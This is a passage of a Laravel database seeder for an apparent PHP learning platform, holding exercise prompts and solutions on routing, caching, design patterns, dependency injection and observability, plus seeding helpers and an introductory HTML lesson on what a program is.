                ['title' => 'L1 — What is a route', 'prompt' => 'Map HTTP method+URI to what Laravel artifact?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Route definition → controller/closure invocation; name for URL generation.', 'hints' => 'URI → action.', 'order' => 1],
                ['title' => 'L3 — Route order bug', 'prompt' => 'static /users/me shadowed by /users/{id} — fix.', 'level' => 3, 'type' => 'debug', 'starter_code' => "Route::get('/users/{id}', ...);\nRoute::get('/users/me', ...);\n", 'solution' => 'Register /users/me before parameterized routes (or rely on Laravel static preference — still define static first for clarity).', 'hints' => 'Static first.', 'order' => 3],
                ['title' => 'L5 — Model binding risk', 'prompt' => 'Implicit binding leaks other users\' rows — what check missing?', 'level' => 5, 'type' => 'debug', 'starter_code' => "Route::get('/invoices/{invoice}', ...);\n", 'solution' => 'Authorization (policy) or scope binding to user — abort 403/404 if not owner. Binding only proves existence, not permission.', 'hints' => 'Policy after bind.', 'order' => 5],
            ],
            'M2' => [
                ['title' => 'L1 — Queue vs sync', 'prompt' => 'When is sync driver fine?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Local/dev or very fast jobs — runs inline in request; not for slow/urgent-retry work in prod.', 'hints' => 'Inline = sync.', 'order' => 1],
                ['title' => 'L4 — Cache layers', 'prompt' => 'Design cache for config, views, query rows — keys and invalidation hooks.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'config:long TTL + clear on deploy; views: compile on build; queries: tags/keys by entity id, forget on model saved/deleted events.', 'hints' => 'TTL + forget hooks.', 'order' => 4],
                ['title' => 'L5 — Deploy checklist', 'prompt' => 'Production deploy: 5 artisan/system steps for Laravel.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'maintenance mode, migrate, config/route/view cache optimize, queue restart, release assets, smoke checks, exit maintenance.', 'hints' => 'migrate + optimize + queue:restart.', 'order' => 5],
                ['title' => 'L6 — Failure modes', 'prompt' => 'Redis down: what breaks in this app (session/cache/queue) and degradation plan.', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Sessions/cache miss → fallback file/db store or read-only cache bypass; queue backlog grows → workers alert; plan: multi-AZ Redis, circuit break, sticky sessions only as last resort.', 'hints' => 'Fallback + alert.', 'order' => 6],
                ['title' => 'L2 — Dispatch a job', 'prompt' => 'Sketch dispatching SendWelcomeEmail job after user register (sync vs queue note).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// dispatch after create\n", 'solution' => "<?php\n// SendWelcomeEmail::dispatch(\$user->id);\n// queue for slow SMTP; sync only in tests/dev\n", 'hints' => 'Job::dispatch.', 'order' => 7],
                ['title' => 'L4 — Cache strategy', 'prompt' => 'Design cache keys + invalidation for a product page.', 'level' => 4, 'type' => 'design', 'starter_code' => "// key:\n// invalidate:\n", 'solution' => 'Key product:{id}:v{n} or hash; TTL 60s; bust on product saved event; avoid caching per-user HTML without vary.', 'hints' => 'Key + TTL + bust.', 'order' => 8],
            ],
            'N1' => [
                ['title' => 'L2 — Pattern naming', 'prompt' => 'Give the pattern name: single class creating families of related objects without concrete classes.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Abstract Factory.', 'hints' => 'Families of objects.', 'order' => 2],
                ['title' => 'L4 — When pattern', 'prompt' => 'Strategy for payment gateways vs if/else — when does pattern pay off?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'When variants grow independently, need tests per variant, or config selects at runtime — not for one hardcoded branch forever.', 'hints' => 'Growth + tests.', 'order' => 4],
                ['title' => 'L6 — Anti-pattern smell', 'prompt' => 'Over-engineering with patterns — how do you spot and cut it?', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Many indirections, no second implementation, tests harder to write, junior onboarding slows. Collapse to concrete until second use case appears.', 'hints' => 'YAGNI + navigate.', 'order' => 6],
            ],
            'K4' => [
                ['title' => 'L1 — Identity Map purpose', 'prompt' => 'In 2–3 sentences: what does an Identity Map guarantee during a Unit of Work?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'For a given primary key, only one in-memory object exists for the lifetime of the unit of work. Reloading the same row returns that instance so mutations are consistent before one commit.', 'hints' => 'One object per id.', 'order' => 1],
                ['title' => 'L2 — Minimal find with map', 'prompt' => 'Sketch a UserMapper::find that caches by id in an array (pseudo-PHP or real).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nclass UserMapper\n{\n    private array \$map = [];\n\n    public function find(int \$id): array\n    {\n        // return cached row or load and cache\n    }\n}\n", 'solution' => "<?php\nclass UserMapper {\n    private array \$map = [];\n    public function find(int \$id): array {\n        return \$this->map[\$id] ??= \$this->load(\$id);\n    }\n    private function load(int \$id): array { /* SELECT ... WHERE id = ? */ return ['id' => \$id]; }\n}\n", 'hints' => '??= caches on first load.', 'order' => 2],
                ['title' => 'L4 — Unit of Work outline', 'prompt' => 'Design API: registerInsert, registerUpdate, registerDelete, commit. What does commit do?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Track pending ops per entity; commit opens one transaction, flushes inserts/updates/deletes in FK-safe order, commits or rolls back all, clears the dirty set.', 'hints' => 'One transaction.', 'order' => 4],
                ['title' => 'L6 — Eloquent vs hand mapper', 'prompt' => 'Defend choosing Eloquent over a hand-rolled Data Mapper for this app (4 bullets) — and one case where you would not.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Faster delivery; relations/eager loading; casts; ecosystem. Skip hand mapper when learning mapping, integrating a legacy schema with no ORM, or needing SQL control Eloquent cannot express cleanly without fighting it.', 'hints' => 'Productivity vs control.', 'order' => 6],
            ],
            'M3' => [
                ['title' => 'L1 — PR checklist', 'prompt' => 'List 4 things that should be green before a PR merges.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Pint/style, tests, static analysis if used, no secrets, readable diff, ticket link — pick the team’s enforced set.', 'hints' => 'CI gates.', 'order' => 1],
                ['title' => 'L2 — Safe commit message', 'prompt' => 'Write a good subject line for a fix that stops XSS in the bio field.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'fix: escape user bio HTML output to prevent stored XSS — imperative mood, scoped, explains why.', 'hints' => 'fix:/feat:/chore: prefix.', 'order' => 2],
                ['title' => 'L4 — Rebase vs merge', 'prompt' => 'Team uses merge commits on main; you have a feature branch — when is rebase helpful? When forbidden?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Rebase your unpushed branch onto main for linear local history. Never rebase after push if others built on it (rewrites shared history) — use merge or revert instead.', 'hints' => 'Unpushed only.', 'order' => 4],
                ['title' => 'L5 — CI failure triage', 'prompt' => 'CI red on Pest but green locally — 3 likely causes and first action.', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Env/key missing; .env.example drift; DB/cache driver; flaky test order; missing npm build. First: read failed job log, reproduce with same PHP version, fix root cause not rerun blindly.', 'hints' => 'Read the log.', 'order' => 5],
            ],
            'N4' => [
                ['title' => 'L1 — Arrow meaning', 'prompt' => 'In a UML class diagram, what does a dashed open arrow (··&gt;) mean vs solid filled (—|&gt;)?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Dashed open arrow = dependency (uses temporarily). Solid line with closed/hollow triangle = inheritance/realization (is-a).', 'hints' => 'Dependency vs generalization.', 'order' => 1],
                ['title' => 'L2 — Class diagram for Lesson/Stage', 'prompt' => 'ASCII/text class diagram: Stage and Lesson with multiplicity and a composition or association.', 'level' => 2, 'type' => 'code', 'starter_code' => "// Stage\n// Lesson\n", 'solution' => "Stage\n  - slug: string\n  + lessons(): Lesson[]\n\nLesson\n  - code: string\n  - title: string\n\nStage \"1\" o-- \"*\" Lesson : lessons", 'hints' => 'One stage, many lessons.', 'order' => 2],
                ['title' => 'L4 — Sequence: lesson page', 'prompt' => 'Sequence diagram steps for GET /lessons/{slug} from browser to HTML (6–8 arrows).', 'level' => 4, 'type' => 'design', 'starter_code' => "// Browser\n// Router\n// ...\n", 'solution' => 'Browser → GET /lessons/slug → index.php/router → middleware → pages::lesson-show mount → Lesson+prereqs query → view render → HTML response → Browser.', 'hints' => 'Request lifecycle.', 'order' => 4],
            ],
            'N5' => [
                ['title' => 'L1 — Name the pattern', 'prompt' => 'Middleware that logs then calls the next handler — which GoF family/pattern?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Decorator (structural) — wraps a handler to add behavior while keeping the same interface.', 'hints' => 'Wrap to extend.', 'order' => 1],
                ['title' => 'L2 — Strategy for export', 'prompt' => 'Implement Exporter interface with CsvExporter and JsonExporter used by a client (sketch).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\ninterface Exporter { public function export(array \$rows): string; }\n// CsvExporter, JsonExporter, Client\n", 'solution' => "<?php\ninterface Exporter { public function export(array \$rows): string; }\nclass CsvExporter implements Exporter { public function export(array \$rows): string { /* fputcsv logic */ return \"\"; } }\nclass JsonExporter implements Exporter { public function export(array \$rows): string { return json_encode(\$rows, JSON_THROW_ON_ERROR); } }\nclass Client { public function __construct(private Exporter \$exporter) {} public function run(array \$rows): string { return \$this->exporter->export(\$rows); } }\n", 'hints' => 'Depend on interface.', 'order' => 2],
                ['title' => 'L3 — Over-engineered singleton', 'prompt' => 'Class uses static getInstance just to hold a config array — problems and simpler design.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass Config {\n    private static ?self \$i = null;\n    public static function get(): self { return self::\$i ??= new self(); }\n}\n", 'solution' => 'Hidden global mutable state, hard tests, static lifetime. Prefer injecting a readonly config DTO/array from the container or function params.', 'hints' => 'Inject instead of static.', 'order' => 3],
                ['title' => 'L4 — Observer vs poll', 'prompt' => 'When is Observer (events) worse than a direct call or queue? 3 bullets.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Hidden control flow; ordering/async surprises; harder debugging if many listeners. Prefer direct call for one sync dependency; queue for slow work; events when N independent listeners must not couple to the emitter.', 'hints' => 'Coupling vs clarity.', 'order' => 4],
                ['title' => 'L5 — Null Object logger', 'prompt' => 'Show injecting a NullLogger when logging is optional — why better than if ($logger).', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Callers always call log() with no null checks; default NullLogger no-ops; tests assert no message or swap a spy. Removes scattered conditionals and null risks.', 'hints' => 'No-op collaborator.', 'order' => 5],
                ['title' => 'L6 — Visitor fit', 'prompt' => 'Project has 8 entity types and 5 operations each — visitor or strategy-per-entity? Trade-offs.', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Visitor: easy new operations, hard new entity types (update all visitors). Strategy/interface on entity: easy new types, operations scattered. Pick based on which axis changes more.', 'hints' => 'Which axis grows?', 'order' => 6],
            ],
            'N6' => [
                ['title' => 'L1 — Map pattern to file', 'prompt' => 'Match: Front Controller, Page Controller, Template View → this repo artifacts.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Front Controller: public/index.php + router. Page Controller: Livewire pages / route actions. Template View: Blade templates.', 'hints' => 'Entry / page / view.', 'order' => 1],
                ['title' => 'L2 — Mini page controller', 'prompt' => 'Write a single-action function controller that validates input and returns a view name (sketch).', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\nfunction showLesson(string \$slug): string\n{\n    // validate, find, return view\n}\n", 'solution' => "<?php\nfunction showLesson(string \$slug): string {\n    if (! preg_match('/^[a-z0-9-]+$/', \$slug)) { abort(404); }\n    \$lesson = Lesson::where('slug', \$slug)->firstOrFail();\n    return view('pages::lesson-show', ['lesson' => \$lesson])->render();\n}\n", 'hints' => 'Validate then query.', 'order' => 2],
                ['title' => 'L4 — TS vs Domain Model', 'prompt' => 'Checkout rules grow: tax, inventory, coupons, fraud. When do you promote Transaction Script to Domain Model?', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'When the same invariants repeat across endpoints, branches tangle, and tests need fixtures for rule state — extract Order/Checkout domain objects with behavior; keep TS for simple admin CRUD.', 'hints' => 'Rules multiply.', 'order' => 4],
                ['title' => 'L5 — Registry smell review', 'prompt' => 'Teammate adds GlobalRegistry::get(DB) everywhere — review risks and fix.', 'level' => 5, 'type' => 'debug', 'starter_code' => "Registry::get('db')->...\n", 'solution' => 'Hidden dependencies, static coupling, untestable, service locator anti-pattern. Inject via constructor; bind in container; tests swap fakes.', 'hints' => 'Inject dependencies.', 'order' => 5],
                ['title' => 'L6 — Pattern map defense', 'prompt' => 'Interviewer: “name the enterprise patterns in a Laravel CRUD feature” — 60-second answer.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Front controller entry+router; application controller middleware/route resolution; page controller = route/Livewire action; template view = Blade; transaction script or domain model in service; identity map-ish model registry; unit of work via transactions on save batch.', 'hints' => 'Entry → middleware → action → view → domain → persist.', 'order' => 6],
            ],
            'N2' => [
                ['title' => 'L1 — IoC meaning', 'prompt' => 'Invert who creates the dependency — one sentence.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Instead of class newing deps, framework/caller supplies them (control inverted to caller/container).', 'hints' => 'Caller supplies.', 'order' => 1],
                ['title' => 'L3 — Hard-wired new', 'prompt' => 'Service does new StripeClient inside method — hard to test. Fix with DI.', 'level' => 3, 'type' => 'debug', 'starter_code' => "<?php\nclass Billing {\n    public function charge(): void { \$c = new StripeClient(); }\n}\n", 'solution' => 'Constructor-inject StripeClientInterface; bind in container; tests pass fake client.', 'hints' => 'Inject interface.', 'order' => 3],
                ['title' => 'L4 — Service registration', 'prompt' => 'When bind vs singleton vs scoped in Laravel?', 'level' => 4, 'type' => 'explain', 'starter_code' => null, 'solution' => 'bind: new each resolve; singleton: one shared; scoped: one per request/job — match lifetime of state.', 'hints' => 'Match lifetime.', 'order' => 4],
                ['title' => 'L6 — Architecture review', 'prompt' => 'Domain services calling Facades everywhere — review concerns and direction.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Hidden deps, hard tests, framework coupling in domain. Prefer pure domain + thin adapters; facades at edges/controllers.', 'hints' => 'Pure core.', 'order' => 6],
                ['title' => 'L2 — Container bind interface', 'prompt' => 'Bind PaymentGateway interface to StripeGateway in a provider — sketch.', 'level' => 2, 'type' => 'code', 'starter_code' => "<?php\n// in AppServiceProvider register()\n", 'solution' => "<?php\n\$this->app->bind(\\App\\Contracts\\PaymentGateway::class, \\App\\Services\\StripeGateway::class);\n", 'hints' => 'bind(Interface, Impl).', 'order' => 7],
            ],
            'N3' => [
                ['title' => 'L1 — Code smell name', 'prompt' => 'Method with 5 levels of nesting and 80 lines — smell name?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Long method / deep nesting / god function — extract and flatten.', 'hints' => 'Long method.', 'order' => 1],
                ['title' => 'L4 — Extract steps', 'prompt' => 'Given prose "validate, save, email, log" — name extracted methods and order.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'validateRequest(); persist(); sendConfirmation(); auditLog(); — orchestrate in one thin entry method.', 'hints' => 'One job each.', 'order' => 4],
                ['title' => 'L5 — Refactor safety', 'prompt' => 'How do you refactor without behavior change? 4 rules.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Green tests first; tiny steps; run suite each step; no renames+logic in same commit; pint only formatting separate.', 'hints' => 'Green + small steps.', 'order' => 5],
                ['title' => 'L6 — Diff review', 'prompt' => 'PR: 40 files mixed style+logic. Review comment you leave.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Split formatting from behavior; hard to review/regress; rebase onto pint-only commit first so logic diffs readable.', 'hints' => 'Separate concerns.', 'order' => 6],
            ],
            'O1' => [
                ['title' => 'L1 — Horizontal vs vertical scale', 'prompt' => 'One line each.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Horizontal: more machines. Vertical: bigger machine (CPU/RAM).', 'hints' => 'More nodes vs bigger node.', 'order' => 1],
                ['title' => 'L3 — Single point of failure', 'prompt' => 'Name SPOFs in a typical one-server Laravel+MySQL setup.', 'level' => 3, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'The server itself, MySQL disk, single Redis if used, single queue worker — mitigate with backups, replicas, multi-instance workers.', 'hints' => 'Server + DB.', 'order' => 3],
                ['title' => 'L5 — SLO choice', 'prompt' => 'Pick initial SLO for a learning app: availability and latency — justify simply.', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'e.g. 99.5% monthly success, p95 < 500ms read — matches small team ops load; document error budget for feature freeze if burned.', 'hints' => 'Match team size.', 'order' => 5],
            ],
            'O2' => [
                ['title' => 'L1 — Logs vs metrics', 'prompt' => 'When query logs vs metrics?', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Metrics for aggregates/trends/alerts; logs for specific request context and debugging examples.', 'hints' => 'Trend vs detail.', 'order' => 1],
                ['title' => 'L4 — Alert design', 'prompt' => 'Design one alert: condition, window, severity, runbook link.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'If 5xx rate > 2% for 10m page; warn > 1% 30m; runbook URL in annotation; avoid single-flap pages.', 'hints' => 'Rate + window.', 'order' => 4],
                ['title' => 'L5 — Trace sampling', 'prompt' => 'Why sample traces? What to always keep?', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Cost/volume; keep 100% of errors/slow traces, sample healthy fast paths; propagate sampling decision across services.', 'hints' => 'Errors always on.', 'order' => 5],
                ['title' => 'L6 — Incident comms', 'prompt' => 'Sev1 checkout down — first 15 minutes actions (checklist).', 'level' => 6, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Ack page, open bridge, check recent deploys/status, hard metrics on latency/errors/saturation, communicate ETA cadence, prepare rollback.', 'hints' => 'Ack → deploys → metrics.', 'order' => 6],
            ],
            'O3' => [
                ['title' => 'L2 — Micro-benchmark hygiene', 'prompt' => 'What ruins a PHP micro-benchmark? 3 things.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'JIT/opcache warmup ignored; I/O inside loop; measuring noise without enough iterations/statistics.', 'hints' => 'Warmup + I/O + noise.', 'order' => 2],
                ['title' => 'L4 — Profile first', 'prompt' => 'Page 800ms — ordered tool plan (dev/prod safe).', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Enable timing middleware, DB query log count, blackfire/tideways or xdebug profile on staging, compare flame graphs to baseline.', 'hints' => 'Measure then optimize.', 'order' => 4],
                ['title' => 'L5 — Premature optimize', 'prompt' => 'When is micro-optimizing PHP wrong? Give concrete example.', 'level' => 5, 'type' => 'explain', 'starter_code' => null, 'solution' => 'When bottleneck is N+1 SQL or external API — shaving string concat ms is irrelevant. Profile first; optimize top frame.', 'hints' => 'Find real bottleneck.', 'order' => 5],
                ['title' => 'L6 — Perf budget review', 'prompt' => 'Team wants always-on full profiling in prod — trade-offs.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'CPU/overhead, PII in traces, cardinality explosion, cost. Prefer continuous profiling sampled, or on-demand attach + APM spans.', 'hints' => 'Sample + PII + cost.', 'order' => 6],
            ],
            'P1' => [
                ['title' => 'L1 — Interview structure', 'prompt' => 'Structure a 45-min technical screen: rough time boxes.', 'level' => 1, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => '5 intro, 10 experience, 20 coding/problem, 10 systems/behavior overlap, close with candidate questions — flexible not rigid.', 'hints' => 'Intro / problem / close.', 'order' => 2],
                ['title' => 'L4 — System prompt case', 'prompt' => 'Design a 15-minute design interview prompt: shortener for candidates — what you evaluate.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Clarify requirements, estimates, API, storage, cache, scale steps; score communication, trade-offs, not perfect diagrams.', 'hints' => 'Requirements → scale.', 'order' => 2],
                ['title' => 'L5 — Grading rubric', 'prompt' => 'Rubric dimensions for mid-level PHP screen (4 items with pass bar).', 'level' => 5, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Correctness under edge cases; security basics (escaping/authz); test instinct; clear naming/structure. Bar: completes with hints on one, secure defaults.', 'hints' => 'Edge + security + tests.', 'order' => 3],
                ['title' => 'L2 — Behavioral STAR', 'prompt' => 'Structure a STAR answer for “tell me about a hard bug you fixed”.', 'level' => 2, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Situation context, Task your responsibility, Action steps you took, Result measurable outcome + what you learned.', 'hints' => 'Situation Task Action Result.', 'order' => 4],
                ['title' => 'L4 — System design walkthrough', 'prompt' => 'Walk a URL shortener in 60 seconds: requirements → API → storage → scale.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => 'Requirements short links; API POST /shorten GET /{code}; base62 id or hash; table redirects(code→url); cache reads; later sharding.', 'hints' => 'Req → API → store → scale.', 'order' => 4],
            ],
            'P2' => [
                ['title' => 'L1 — Feynman check', 'prompt' => 'Explain HTTP session in 3 sentences a non-dev follows.', 'level' => 1, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Your browser gets a ticket (cookie). Each request shows the ticket so the server knows it is you. Server looks up what you were doing using that ticket id.', 'hints' => 'Ticket analogy.', 'order' => 2],
                ['title' => 'L4 — Teach-back plan', 'prompt' => 'Plan teaching N+1 to a junior: 4 steps including an exercise.', 'level' => 4, 'type' => 'design', 'starter_code' => "// ...\n", 'solution' => '1 Show slow loop query log. 2 Name N+1. 3 Fix with with(). 4 Exercise: convert list page; measure query count before/after.', 'hints' => 'Show → fix → drill.', 'order' => 2],
                ['title' => 'L6 — Whiteboard defense', 'prompt' => 'You chose monolith; interviewer pushes microservices — defend with constraints.', 'level' => 6, 'type' => 'explain', 'starter_code' => null, 'solution' => 'Team size, deploy cadence, org maturity, transactional needs; name the future seam where split pays (e.g. separate scaling worker) without rewriting now.', 'hints' => 'Constraints + seam.', 'order' => 3],
            ],
        ];
    }

    /** @param array<string, mixed> $blueprint */
    private function seedLesson(Stage $stage, array $blueprint): Lesson
    {
        return Lesson::query()->updateOrCreate(
            ['slug' => $blueprint['slug']],
            [
                'stage_id' => $stage->id,
                'code' => $blueprint['code'],
                'title' => $blueprint['title'],
                'summary' => $blueprint['summary'],
                'body_html' => $blueprint['body'],
                'order_column' => $blueprint['order'],
                'sort_order' => $blueprint['sort'],
                'estimated_minutes' => $blueprint['minutes'],
                'difficulty' => $blueprint['difficulty'],
                'is_published' => true,
                'requires_checkpoint' => $blueprint['checkpoint'],
                'metadata' => ['stage' => $stage->title],
            ],
        );
    }

    /**
     * @param  array<string, Lesson>  $lessons
     * @param  array<string, list<string>>  $map
     */
    private function syncPrerequisites(array $lessons, array $map): void
    {
        foreach ($map as $code => $prereqCodes) {
            $ids = [];

            foreach ($prereqCodes as $pre) {
                if (isset($lessons[$pre])) {
                    $ids[] = $lessons[$pre]->id;
                }
            }

            $lessons[$code]->prerequisites()->sync($ids);
        }
    }

    /** @param list<array<string, mixed>> $questions */
    private function seedCheckpoint(Lesson $lesson, array $questions): void
    {
        Checkpoint::query()->updateOrCreate(
            ['lesson_id' => $lesson->id, 'title' => 'Checkpoint — '.$lesson->code],
            [
                'questions' => $questions,
                'pass_score' => 70,
                'is_published' => true,
            ],
        );
    }

    /** @param list<array<string, mixed>> $exercises */
    private function seedExercises(Lesson $lesson, array $exercises): void
    {
        foreach ($exercises as $exercise) {
            Exercise::query()->updateOrCreate(
                ['lesson_id' => $lesson->id, 'title' => $exercise['title']],
                [
                    'prompt' => $exercise['prompt'],
                    'level' => $exercise['level'],
                    'type' => $exercise['type'],
                    'starter_code' => $exercise['starter_code'],
                    'solution' => $exercise['solution'],
                    'expected_output' => $exercise['expected_output'] ?? null,
                    'hints' => $exercise['hints'],
                    'order_column' => $exercise['order'],
                    'is_published' => true,
                ],
            );
        }
    }

    private function seedProject(Stage $stage): void
    {
        Project::query()->updateOrCreate(
            ['slug' => 'l1-expense-tracker'],
            [
                'stage_id' => $stage->id,
                'title' => 'L1 — CLI Expense Tracker',
                'description' => 'Level 1 project: terminal app that records expenses, totals by category, and prints a report.',
                'requirements' => [
                    'Store expenses in PHP arrays (later JSON file)',
                    'Add expense with amount + category',
                    'Print total and per-category breakdown',
                    'Handle invalid input without crashing',
                ],
                'milestones' => [
                    ['title' => 'Data shape', 'done' => false],
                    ['title' => 'Add + list', 'done' => false],
                    ['title' => 'Totals report', 'done' => false],
                    ['title' => 'Validation', 'done' => false],
                ],
                'evaluation_criteria' => [
                    'Correct totals',
                    'Clear function boundaries',
                    'No undefined variable notices',
                ],
                'level' => 'beginner',
                'order_column' => 1,
            ],
        );

        Project::query()->updateOrCreate(
            ['slug' => 'l3-library-oop'],
            [
                'stage_id' => Stage::query()->where('slug', 'stage-5')->first()->id,
                'title' => 'L3 — Library (OOP + tests)',
                'description' => 'Book/Member/Loan domain with composition, interfaces, and Pest tests.',
                'requirements' => [
                    'Models with encapsulation and invariants',
                    'Repository persistence (JSON is fine)',
                    'Unit tests for loan rules',
                ],
                'milestones' => [
                    ['title' => 'Domain model', 'done' => false],
                    ['title' => 'Loan rules', 'done' => false],
                    ['title' => 'Tests green', 'done' => false],
                ],
                'evaluation_criteria' => [
                    'SOLID names',
                    'No god object',
                    'Tests cover edge cases',
                ],
                'level' => 'intermediate',
                'order_column' => 3,
            ],
        );

        Project::query()->updateOrCreate(
            ['slug' => 'l6-production-api'],
            [
                'stage_id' => Stage::query()->where('slug', 'stage-12')->first()->id,
                'title' => 'L6 — Production-style API',
                'description' => 'Auth + roles + REST + queues + cache + tests + observability checklist.',
                'requirements' => [
                    'JWT or session auth',
                    'Role-based authz',
                    'Feature tests in CI',
                    'Runbook + health checks',
                ],
                'milestones' => [
                    ['title' => 'Auth', 'done' => false],
                    ['title' => 'CRUD + tests', 'done' => false],
                    ['title' => 'Queues + cache', 'done' => false],
                    ['title' => 'Deploy notes', 'done' => false],
                ],
                'evaluation_criteria' => [
                    'Security review clean',
                    'p95 latency budget documented',
                    'Rollback plan written',
                ],
                'level' => 'senior',
                'order_column' => 6,
            ],
        );
    }

    private function seedAdmin(): void
    {
        User::query()->updateOrCreate(
            ['email' => 'test@example.com'],
            [
                'name' => 'Test User',
                'password' => 'password',
                'role' => 'admin',
                'email_verified_at' => now(),
            ],
        );
    }

    private function a0Body(): string
    {
        return <<<'HTML'
<h1>Lesson A0 — What a Program Is</h1>
<p class="lead">Stage 0 · Foundations · No prior knowledge required</p>

<p>Every bug you will ever debug, every memory limit you will hit, and every server you will deploy traces back to one idea: what a program is, and how it becomes a running process. This lesson plants that idea before you write any code.</p>

<h2>You already know how to give instructions</h2>
<p>Ask a person to “send the invoice once the job is done” and they quietly fill in every gap — what an invoice is, where to send it, what counts as done. A computer refuses to fill in gaps. It executes exactly what the instructions say, in order, nothing more. That refusal is not a limitation to work around; it is the reason programs are reliable at all.</p>

<h2>A program is a recipe that a machine follows exactly</h2>
<p>Take the everyday meaning of a recipe — inputs, ordered steps, an output — and remove the human intuition. That is a program: a list of precise instructions that turns <em>input</em> into <em>output</em>.</p>
<pre>INPUT → [ PROGRAM ] → OUTPUT
          (rules)</pre>
<p>The same shape recurs all course: a request (input) handled by your Laravel app (program) producing a response (output).</p>

<h2>Watch the whole chain run</h2>
<p>Before reading on, guess what happens between typing <code>php hello.php</code> and seeing text appear:</p>
<pre><code class="language-php">&lt;?php
$name = 'Developer';
echo "Hello, {$name}!\n";</code></pre>
<p><strong>Predict first:</strong> does the computer parse the file, load it into RAM, or execute it — and in what order?</p>
<pre><code>Source code (hello.php)
        ↓
Interpreter / Compiler (Zend Engine)
        ↓
Opcodes / machine instructions
        ↓
PROCESS  (OS loads into RAM)
        ↓
CPU executes step-by-step
        ↓
Output (screen, file, network)</code></pre>
<p>The file on disk never changes; the process is the live copy the CPU actually runs. Confusing the two is the most common early mistake — and exactly what “file vs process” interview questions test.</p>

<h3>The vocabulary this chain introduces</h3>
<ul>
  <li><strong>Source code</strong> — the <code>.php</code> text you write</li>
  <li><strong>Compiler</strong> — translates ahead of time (C)</li>
  <li><strong>Interpreter</strong> — translates while running</li>
  <li><strong>Runtime</strong> — environment executing the code</li>
  <li><strong>Process</strong> — a running program with memory + CPU time</li>
  <li><strong>CPU</strong> — executes instructions</li>
  <li><strong>RAM</strong> — holds code + data while running</li>
  <li><strong>Storage</strong> — files persist when power is off</li>
</ul>

<h2>Where PHP sits today</h2>
<p>Modern PHP is neither a pure compiler nor a naive interpreter: the Zend Engine parses your source into <strong>opcodes</strong>, and opcache reuses those opcodes so they are not rebuilt on every request. Two execution environments matter in this course — <strong>CLI</strong> (<code>php script.php</code>) for scripts and tools, and <strong>web</strong> (Apache/Nginx + PHP-FPM) for requests. Same language, different lifecycle: a CLI script runs once and exits; a web process serves many short-lived requests.</p>

<h3>Where beginners get stuck</h3>
<ul>
  <li>Forgetting <code>&lt;?php</code> — the file is then sent to the browser as plain text</li>
  <li>Expecting the computer to “understand intent” — it only follows written steps</li>
  <li>Confusing the file (disk) with the process (RAM)</li>
</ul>

<h2>Practice it out loud</h2>
<p>Run the snippet above yourself, then explain to an imaginary colleague what happens between <code>php file.php</code> and seeing output. Keep the answer under two minutes — that time limit is the interview constraint you are training for.</p>

<h2>Interview drill</h2>
<ol>
  <li>What happens between <code>php file.php</code> and seeing output?</li>
  <li>Compiler vs interpreter — where does modern PHP sit?</li>
  <li>Program vs process?</li>
</ol>

<h2>Where this leads</h2>
<pre><code>A0 program → process → I/O
  ↓
A1 Run PHP confidently
  ↓
Types / variables → memory → functions → OOP</code></pre>
HTML;
    }

    private function a1Body(): string
    {
        return <<<'HTML'
<h1>Lesson A1 — Running PHP</h1>
